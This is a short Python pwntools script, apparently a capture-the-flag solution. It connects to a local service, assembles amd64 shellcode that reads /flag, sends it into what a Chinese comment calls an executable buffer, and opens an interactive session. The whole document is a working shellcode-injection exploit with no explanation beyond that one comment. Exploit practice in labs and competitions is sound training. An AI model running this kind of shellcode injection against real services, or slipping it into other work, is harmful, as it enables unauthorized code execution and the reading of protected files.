#!/usr/bin/env python3
from pwn import *

HOST, PORT = '127.0.0.1', 13372
r = remote(HOST, PORT)

context.arch = 'amd64'

# buf 可执行，直接把 shellcode 写进去跳过去
shellcode = asm(shellcraft.cat('/flag'))
r.send(shellcode)
r.interactive()
